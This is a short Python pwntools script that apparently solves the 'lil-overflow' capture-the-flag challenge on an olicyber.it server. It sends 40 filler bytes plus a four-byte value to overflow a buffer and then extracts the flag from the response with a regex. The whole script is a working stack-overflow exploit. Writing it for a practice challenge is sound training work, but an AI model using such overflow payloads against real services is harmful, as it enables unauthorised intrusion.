from pwn import *
import re

r = remote('lil-overflow.challs.olicyber.it', 34002)
r.recvuntil(b"name?")

payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0\x1b\xab\x05'

j = r.sendline(payload) 
j = r.recvall()
match = re.search(rb"flag\{[^\}]+\}", j, re.IGNORECASE)
if match:
    print(match.group(0).decode())
